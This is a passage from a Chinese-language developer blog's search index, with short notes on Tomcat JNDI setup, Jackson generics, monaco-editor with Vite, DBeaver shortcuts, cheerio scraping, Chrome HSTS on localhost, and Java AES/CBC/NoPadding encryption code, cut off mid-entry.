聲音裝置預設/預設通訊裝置","uri":"/blog/posts/%E6%AD%A3%E7%A2%BA%E6%8E%A7%E5%88%B6-Window-%E9%BA%A5%E5%85%8B%E9%A2%A8-%E8%81%B2%E9%9F%B3%E8%A3%9D%E7%BD%AE%E9%A0%90%E8%A8%AD-%E9%A0%90%E8%A8%AD%E9%80%9A%E8%A8%8A%E8%A3%9D%E7%BD%AE/"},{"categories":["Java"],"content":"Eclipse 設定 JDNI 連資料庫 參考: PostgreSQL MySQL 的 JNDI 資料來源 | 他山教程，只選擇最優質的自學材料 java - SEVERE: Unable to create initial connections of pool - tomcat 7 with context.xml file - Stack Overflow ","date":"2021-10-09","objectID":"/blog/posts/Eclipse-%E8%A8%AD%E5%AE%9A-JDNI-%E9%80%A3%E8%B3%87%E6%96%99%E5%BA%AB/:0:0","tags":["eclipse","java","jndi"],"title":"Eclipse 設定 JDNI 連資料庫","uri":"/blog/posts/Eclipse-%E8%A8%AD%E5%AE%9A-JDNI-%E9%80%A3%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["Java"],"content":"設定 設定 server.xml 設定 資料連線 \u003cResource name=\"XXXPool\" factory=\"org.apache.tomcat.jdbc.pool.DataSourceFactory\" auth=\"Container\" type=\"javax.sql.DataSource\" username=\"dbuser\" password=\"dbpassword\" url=\"jdbc:postgresql://192.168.1.1:5444/dbname\" driverClassName=\"org.postgresql.Driver\" initialSize=\"20\" maxWaitMillis=\"15000\" maxTotal=\"75\" maxIdle=\"20\" maxAge=\"7200000\" testOnBorrow=\"true\" validationQuery=\"select 1\" /\u003e 設定 context.xml \u003cResourceLink name=\"XXXPool\" global=\"XXXPool\" type=\"javax.sql.DataSource\"/\u003e 放資料庫連線 jar 到 apache-tomcat-7.0.82\\lib 設定 Spring ApplicationContext.xml 的 JNDI 連線資訊 \u003cbean id=\"dataSource\" class=\"org.springframework.jndi.JndiObjectFactoryBean\"\u003e \u003cproperty name=\"jndiName\"\u003e \u003cvalue\u003ejava:comp/env/XXXPool\u003c/value\u003e \u003c/property\u003e \u003cproperty name=\"cache\" value=\"false\" /\u003e \u003c/bean\u003e 相關可參考: Name jdbc is not bound in this Context - 坏~牧羊人 - 博客园 在spring配置文件中引用jdbc/oracleds時，應該前面加上java:comp/env/,全名為java:comp/env/jdbc/oracleds Oracle DataBase JNDI 在 JBoss EAP 6.x 上的設定 @ MISTECH 技術手抄本 :: 痞客邦 :: 備份圖 我們應該瞭解的JNDI資料來源配置_FreeBuf - MdEditor 可否說明JNDI的用途為何?! @ Davis’ Blog :: 隨意窩 Xuite日誌 菜鳥工程師 肉豬: Spring JBoss AS 5.1 JNDI Oracle Datasource 連線設定 ","date":"2021-10-09","objectID":"/blog/posts/Eclipse-%E8%A8%AD%E5%AE%9A-JDNI-%E9%80%A3%E8%B3%87%E6%96%99%E5%BA%AB/:1:0","tags":["eclipse","java","jndi"],"title":"Eclipse 設定 JDNI 連資料庫","uri":"/blog/posts/Eclipse-%E8%A8%AD%E5%AE%9A-JDNI-%E9%80%A3%E8%B3%87%E6%96%99%E5%BA%AB/"},{"categories":["Java"],"content":"ArrayList 做泛型必須要做特別動作，平常不常做，遇到這個問題需要特別處理。 Jackson 的 JSON 的ObjectMapper 做.getMapper().getTypeFactory().constructCollectionType可以解決這個問題。 這個目前套件Jackson 可以做到，GSON好像也能，但這邊就不深入。 public void test_list_string() { try { String listString = \"[ \\\"1\\\",\\\"2\\\",\\\"3\\\" ]\"; JavaType stringCollection = JsonUtils.getMapper().getTypeFactory().constructCollectionType(List.class, String.class); List\u003cString\u003e dataList = JsonUtils.getMapper().readValue(listString, stringCollection); dataList.forEach(data -\u003e System.out.println(String.format(\"data:%s\", data))); } catch (Exception e) { e.printStackTrace(); } } 详解 Jackson 中的 ObjectMapper 类中的 readValue 方法对泛型的处理 | ckJava Jackson反序列化泛型List(使用JavaType将json字符串转换成泛型List) - 高木子 - 博客园 ","date":"2021-10-09","objectID":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/:0:0","tags":null,"title":"Java Jackson/GSON 處理 JSON 搭配 ArrayList 泛型","uri":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/"},{"categories":["Java"],"content":"綜合比較 借助Jackson的JsonTypeInfo注解实现多态类的解析_bruce128的专栏-CSDN博客_jsontypeinfo ","date":"2021-10-09","objectID":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/:1:0","tags":null,"title":"Java Jackson/GSON 處理 JSON 搭配 ArrayList 泛型","uri":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/"},{"categories":["Java"],"content":"Jackson 最佳處理 tring expected=\"[{\\\"a\\\":12},{\\\"b\\\":23},{\\\"name\\\":\\\"Ryan\\\"}]\"; CollectionType listType = mapper.getTypeFactory().constructCollectionType(ArrayList.class, User.class); List\u003cUser\u003e userList = mapper.readValue(expected, listType); 解決ObjectMapper.convertValue() 遇到的一些問題 – WalkonNet line-bot-sdk-java/Message.java at master · line/line-bot-sdk-java gson/RuntimeTypeAdapterFactory.java at master · google/gson ","date":"2021-10-09","objectID":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/:2:0","tags":null,"title":"Java Jackson/GSON 處理 JSON 搭配 ArrayList 泛型","uri":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/"},{"categories":["Java"],"content":"特別處理 Jackson Json Subtype Mapping · Leo Niedermeier 【JAVA】从泛型中提取类进行json反序列化_zou15590的博客-CSDN博客 ","date":"2021-10-09","objectID":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/:3:0","tags":null,"title":"Java Jackson/GSON 處理 JSON 搭配 ArrayList 泛型","uri":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/"},{"categories":["Java"],"content":"GSON 地雷?? Json反序列化与Java泛型 _weixin_33670786的博客-CSDN博客 ","date":"2021-10-09","objectID":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/:4:0","tags":null,"title":"Java Jackson/GSON 處理 JSON 搭配 ArrayList 泛型","uri":"/blog/posts/Java-Jackson-GSON-%E8%99%95%E7%90%86-JSON-%E6%90%AD%E9%85%8D-ArrayList-%E6%B3%9B%E5%9E%8B/"},{"categories":["JavaScript"],"content":"使用現成 monaco-editor 編輯器，是微軟開源項目，跟 VScode 介面一模一樣。 這邊簡單做個小記。 ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:0:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"設定 安裝 monaco-editor (可看官往調整版本) npm install monaco-editor@0.25.2 設定 HTML , JS \u003cdiv class=\"container\"\u003e \u003cdiv class=\"monaco\" ref=\"monaco\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cscript\u003e import {editor} from 'monaco-editor' export default { mounted(){ editor.create(this.$refs.monaco, { value: \"function hello() {\\n\\talert('Hello world!');\\n}\", language: \"javascript\" }); } } \u003c/script\u003e \u003cstyle scoped\u003e .monaco{ border: 1px solid black; min-height: 800px; } .container{ height: 2/3 } \u003c/style\u003e 主要重點 mounted 不是用 created ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:1:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"官方範例 想說為什麼官方沒入門手冊，但其實看官方 Playground 範例就夠了。 官方 Playground: Monaco Editor Playground ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:2:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"console 報錯 不知道是不是使用 Vite 關係，Webpack 感覺好像也會遇到一樣問題。雖然不影響結果，不知道哪裡出了甚麼問題，好像是 worker 沒正常運作，但我還是嘗試怎麼解決。 相關參考: Error: Unexpected usage (integration with vue) · Issue #1385 · microsoft/monaco-editor · GitHub [webWorker example: Monaco Editor](https://dev.decoupled.com/docs-magic-webWorker-example-monaco 在 Vue3 项目中集成 VSCode - 实现 Vite + Vue3 + MonacoEdit ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:3:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"解決方法 import editorWorker from 'monaco-editor/esm/vs/editor/editor.worker?worker' import jsonWorker from 'monaco-editor/esm/vs/language/json/json.worker?worker' import cssWorker from 'monaco-editor/esm/vs/language/css/css.worker?worker' import htmlWorker from 'monaco-editor/esm/vs/language/html/html.worker?worker' import tsWorker from 'monaco-editor/esm/vs/language/typescript/ts.worker?worker' self.MonacoEnvironment = { getWorker(_, label) { if (label === 'json') { return new jsonWorker() } if (label === 'css' || label === 'scss' || label === 'less') { return new cssWorker() } if (label === 'html' || label === 'handlebars' || label === 'razor') { return new htmlWorker() } if (label === 'typescript' || label === 'javascript') { return new tsWorker() } return new editorWorker() } } 參考來源:Link 你會發現 Firefox 不正常，後來爬了一下文javascript - SyntaxError: import declarations may only appear at top level of a module - Stack Overflow，換成 Chrome 就正常了…。所以這邊還是用 Chrome 開發好了。 GIT: 49fe93f173b92f97904331028b2bc500c9b00368 ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:3:1","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"manaco-editor 搭 yaml npm install js-yaml -D 以人有用過寫測試程式用js-yaml對設定檔做簡查 | 程式狂想筆記，太久之前用的，結果搜尋找到自己的文章XD。 ESM 怎麼載入呢? import * as jsYaml from 'js-yaml' console.log('jsYaml',jsYaml) ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:4:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"manaco-editor 搭 yaml 驗證 使用 monaco-yaml，可以自己訂一個 Yaml Schema Json ，然後定完可用 manaco 做驗證 yaml 是否符合自己訂的內容，我覺得還滿有趣的，但目前不打算深入研究。 參考: 使用 monaco-editor 验证 YAML 数据 pengx17/monaco-yaml: YAML plugin for the Monaco Editor ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:5:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"類似監聽 change event pageEditor.onDidChangeModelContent(e=\u003e{ console.log(pageEditor.getValue()) this.test = pageEditor.getValue() console.log(jsYaml.load(this.test)) }) ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:6:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["JavaScript"],"content":"在webpack中使用monaco-editor 在webpack中使用monaco-editor - zhangzongshan - 博客園 ","date":"2021-10-09","objectID":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/:7:0","tags":["monaco","editor"],"title":"monaco-editor 使用小記(搭配 Vite )","uri":"/blog/posts/monaco-editor-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98-%E6%90%AD%E9%85%8D-Vite/"},{"categories":["DBMS"],"content":"Dbeaver 使用技巧 ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:0:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"SQL 語句快速選擇 Alt + 上下 ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:1:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"快速開啟 DB 連線 Ctrl + Alt + Enter You can turn on/off the right panels by using the following shortcut: Ctrl+7 ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"sql template SQL Templates · dbeaver/dbeaver Wiki ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"查詢管理器 DBeaver Documentation – DBeaver Ctrl+6 ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"裝套件 Optional extensions · dbeaver/dbeaver Wiki DBeaver - Office integration | Eclipse Plugins, Bundles and Products - Eclipse Marketplace ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:5:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"閃退 C:\\Users\\hp\\AppData\\Roaming\\DBeaverData https://blog.csdn.net/alan3258/article/details/113994569 ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:5:1","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"大小寫轉換 您可以將所選文本轉換為小寫 使用以下快捷方式： Ctrl+Shift+Y ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:6:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["DBMS"],"content":"格式 您可以將所選文本轉換為小寫 使用以下快捷方式： Ctrl+Shift+Y ","date":"2021-08-22","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:7:0","tags":["dbeaver"],"title":"Dbeaver 使用技巧","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":["Nodejs"],"content":"官方文件:Chinese README · cheeriojs/cheerio Wiki ","date":"2021-08-22","objectID":"/blog/posts/Nodejs-%E4%BD%BF%E7%94%A8-cheerio-%E5%81%9A%E7%B0%A1%E5%96%AE%E7%88%AC%E8%9F%B2/:0:0","tags":["modejs","爬蟲"],"title":"Nodejs 使用 cheerio 做簡單爬蟲","uri":"/blog/posts/Nodejs-%E4%BD%BF%E7%94%A8-cheerio-%E5%81%9A%E7%B0%A1%E5%96%AE%E7%88%AC%E8%9F%B2/"},{"categories":["Nodejs"],"content":"安裝 cheerio npm install cherrio -D npm -i 与npm install -s与-d的区别 - 世界，太精彩 - 博客园 Cheerio.js.org vs JsDOM – Hardwork beats talent, when talent doesnt, work hard https://qaz33326.pixnet.net/blog/post/46540628-jquery---$.each%E5%A6%82%E4%BD%95%E5%81%9A%E5%88%B0continue,-break const __dirname = path.resolve(); Module in Node.js. 越是使用起來覺得理所當然的東西，有時候停下來想想，越是覺得陌生。 | by TD | TD’s note | Medium import { fileURLToPath } from 'url' import { dirname } from 'path' const __filename = fileURLToPath(import.meta.url) const __dirname = dirname(__filename) Node.js使用ES6 Module | Eddy 思考與學習 使用 tag 查詢不難，跟jQuery 差不多這邊。 Anime-List/YuC-AnimeList.js at master · ACGNTaiwan/Anime-List add generateAnimeList · malagege/vue-myanimelist@63645ca看範例改比較快 ","date":"2021-08-22","objectID":"/blog/posts/Nodejs-%E4%BD%BF%E7%94%A8-cheerio-%E5%81%9A%E7%B0%A1%E5%96%AE%E7%88%AC%E8%9F%B2/:1:0","tags":["modejs","爬蟲"],"title":"Nodejs 使用 cheerio 做簡單爬蟲","uri":"/blog/posts/Nodejs-%E4%BD%BF%E7%94%A8-cheerio-%E5%81%9A%E7%B0%A1%E5%96%AE%E7%88%AC%E8%9F%B2/"},{"categories":["Vue"],"content":"最近setup寫太順，身為新手的我還是先用一般寫法寫。結果遇到怪事， components 竟然叫不出來，結果我用回setup又就可以用了… 結果想到 Vue component 要註冊才能用元件，結果補上就能用了… export default{ components:{ Header,MyAnimeList } } ","date":"2021-08-22","objectID":"/blog/posts/Vue-Component-%E6%B2%92%E6%9C%89-Render-%E5%87%BA%E4%BE%86/:0:0","tags":["vue"],"title":"Vue Component 沒有 Render 出來","uri":"/blog/posts/Vue-Component-%E6%B2%92%E6%9C%89-Render-%E5%87%BA%E4%BE%86/"},{"categories":["WEb"],"content":"上次在本機裝 mkcert 搭配使用 vite，Vite 使用 https 憑證服務方法(搭 mkcert ) | 程式狂想筆記，有做到架起 localhost HTTPS 服務，但後來 Vite 關閉 https 發現還是會導頁至 https，後來我就直接開無痕視窗解決這個問題。今天受不了，網路上找答案。 ","date":"2021-08-22","objectID":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/:0:0","tags":["chrome","https","localhost","htst"],"title":"Chrome 莫名其妙 localhost 會導到 HTTPS","uri":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/"},{"categories":["WEb"],"content":"問題 疑似 HTST 關係，所以頁面會導 HTTPS。 ","date":"2021-08-22","objectID":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/:1:0","tags":["chrome","https","localhost","htst"],"title":"Chrome 莫名其妙 localhost 會導到 HTTPS","uri":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/"},{"categories":["WEb"],"content":"解決方式 參考方式: 瀏覽器強制跳轉 HTTPS 網址怎麼辦？ | Welcome.Web.World https chrome 打不開 解決 localhost 的 http 網站被強制導向 https 的問題 edge適用 (hsts) - HackMD [Chrome] HTTP 網站一直被重新導向至 HTTPS 網站？ | EPH 的程式日記](https://ephrain.net/chrome-http-%E7%B6%B2%E7%AB%99%E4%B8%80%E7%9B%B4%E8%A2%AB%E9%87%8D%E6%96%B0%E5%B0%8E%E5%90%91%E8%87%B3-https-%E7%B6%B2%E7%AB%99%EF%BC%9F/) Chrome 網址輸入 chrome://net-internals/#hsts，可以查看domain訊息。也可以刪掉。 刪除後就正常了 :D。 ","date":"2021-08-22","objectID":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/:2:0","tags":["chrome","https","localhost","htst"],"title":"Chrome 莫名其妙 localhost 會導到 HTTPS","uri":"/blog/posts/Chrome-%E8%8E%AB%E5%90%8D%E5%85%B6%E5%A6%99-localhost-%E6%9C%83%E5%B0%8E%E5%88%B0-HTTPS/"},{"categories":["加密"],"content":"最近公司 API 原有測試程式需要改前後端，才能測試 API。最近在想能不能搭配 Vite \u0026 Vue 能實現前端測試 API。API有做加密，今天就先研究如何實現 AES/CBC/NoPadding加密。 ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:0:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"公司使用情境 API 接口所有參數會經過第一層加密(包最外層變數)，這邊會有一個外部key，內層資料會用內部key再做一次加密。 這邊我還是小小抱怨一下，公司這篇稱外部key為私鑰，內部key為公鑰，我這邊原本看到這邊應該是非對稱加密，當初裡面長輩也說這邊是非對稱加密，但我最近找了一下套件發現不是，之前一直在想這邊怎麼產生公鑰(內部key)、私鑰(外部key)，這邊可以不用想了，密碼應該也是rand 產生出來了。根本不是非對稱加密。 這邊不是重點，我們趕快來想想怎麼比較快錯出來。 ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:1:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"解決方案 我想快速做出來，這邊有想想幾個方案 內部程式 node-java: 載入 Java Method 呼叫加密程式。但我沒有採用此方案，因為還要而外裝node-gpy ，可能還要搭配 node-electron 來使用，修改程式便利性又降低了。 vite-electron-plugin 本來想採取上面方案搭配，但是原因同上。而且風險係數太多。 crypto 好像也能做到，但好像看到相關文章寫沒支援 Padding設定?? 所以先跳過 crypto-js 可以用在web上面，後來採用這個方案。 ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:2:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"實作 Java/JavaScript 做 AES/CBC/NoPadding 網路上這個範例可說是零，我自己整理出來趕快記筆記。 ","date":"2021-08-22","objectID":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/:3:0","tags":["aes","cbc","nopadding","java","javascript"],"title":"JavaScript,Java 實作 AES/CBC/NoPadding 加密方法","uri":"/blog/posts/JavaScript-Java-%E5%AF%A6%E4%BD%9C-AES-CBC-NoPadding-%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95/"},{"categories":["加密"],"content":"Java public static String decryptBase64StrByAES(String encodeBase64Str, String decrypt,String iv) throws UnsupportedEncodingException,InvalidAlgorithmParameterException,NoSuchPaddingException,NoSuchAlgorithmException,InvalidKeyException,BadPaddingException,IllegalBlockSizeException { byte[] unDecryptByte = Base64.decodeBase64(encodeBase64Str); Cipher deCipher = Cipher.getInstance(\"AES/CBC/NoPadding\"); SecretKeySpec decryptSpec = new SecretKeySpec(decrypt.getBytes(), \"AES\"); IvParameterSpec ivspec = new IvParameterSpec(iv.getBytes()); deCipher.init(Cipher.DECRYPT_MODE, decryptSpec, ivspec); return new String(deCipher.doFinal(unDecryptByte), \"UTF-8\").trim(); } public static String encryptBase64StrByAES(String unDecryptStr, String decrypt, String iv) throws UnsupportedEncodingException,InvalidAlgorithmParameterException,NoSuchPaddingException,NoSuchAlgorithmException,InvalidKeyException,BadPaddingException,IllegalBlockSizeException { Cipher cipher = Cipher.getInstance(\"AES/CBC/NoPadding\"); // 補齊16倍數，不足padding zero int blockSize = cipher.getBlockSize(); byte[] dataBytes = unDecryptStr.getBytes(\"UTF-8\"); int plaintextLength = dataBytes.length; if (plaintextLength % blockSize != 0) { plaintextLength = plaintextLength + (blockSize - (plaintextLength % blockSize)); } byte[] plaintext = new byte[plaintextLength]; System.arraycopy(dataBytes, 0, plaintext, 0, dataBytes.length); SecretKeySpec decryptSpec = new SecretKeySpec(decrypt.getBytes(), \"AES\"); IvParameterSpec ivspec = new IvParameterSpec(iv.getBytes()); cipher.init(Cipher.ENCRYPT_MODE, decryptSpec, ivspec); return Base64.encodeBase64String(cipher.doFinal(plaintext)); } 或 /* * */ package com.serpro.library.String; import java.security.NoSuchAlgorithmException; import org.apache.commons.codec.binary.Base64; import javax.crypto.Cipher; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; public class MCrypt { private String iv; private String SecretKey; private IvParameterSpec ivspec; private SecretKeySpec keyspec; private Cipher cipher; public MCrypt(String iv, String key) { try{ this.setIv(iv); this.setSecretKey(key); } catch (Exception e) { } ivspec = new IvParameterSpec(iv.getBytes()); keyspec = new SecretKeySpec(SecretKey.getBytes(), \"AES\"); try { cipher = Cipher.getInstance(\"AES/CBC/NoPadding\"); } catch (NoSuchAlgorithmException e) { // TODO Auto-generated catch block e.printStackTrace(); } catch (NoSuchPaddingException e) { // TODO Auto-generated catch block e.printStackTrace(); } } public String getIv(){ return this.iv; } public IvParameterSpec getIvSpc(){ return this.ivspec; } private void setIv(String iv) throws Exception { if(iv.length() != 16){ throw new Exception(\"Quantidade IV inválida\"); } this.iv = iv; } private void setSecretKey(String key) throws Exception{ if(key.length() != 16){ throw new Exception(\"Quantidade Key Inválido\"); } this.SecretKey = key; } public static void main(String[] args) { try{ MCrypt mcrypt = new MCrypt(\"9sb9510e375d44f0\", \"9756e93d09054s4f\"); String encrypted = mcrypt.encrypt(\"佩德羅加布里埃爾 佩德羅加布里埃爾\"); String decrypted = mcrypt.decrypt(encrypted); System.out.println(encrypted); System.out.println(decrypted); } catch(Exception e){ System.out.println(e.getMessage()); } } public String encrypt(String text) throws Exception { if(text == null || text.length() == 0) throw new Exception(\"Empty string\"); byte[] encrypted = null; try { cipher.init(Cipher.ENCRYPT_MODE, keyspec, ivspec); encrypted = cipher.doFinal(padString(text).getBytes()); } catch (Exception e) { throw new Exception(\"[encrypt] \" + e.getMessage()); } return this.toBase64(encrypted); } public String decrypt(String code) throws Exception { if(code == null || code.length() == 0) throw new Exception(\"Empty string\"); byte[] decrypted = null; try { cipher.init(Cipher.DECRYPT_MODE, keyspec, ivspec); decrypted = cipher.doFinal(Base64.decodeBase64(code)); //Remove trailing zeroes if( decrypted.length \u003e 0) { int trim 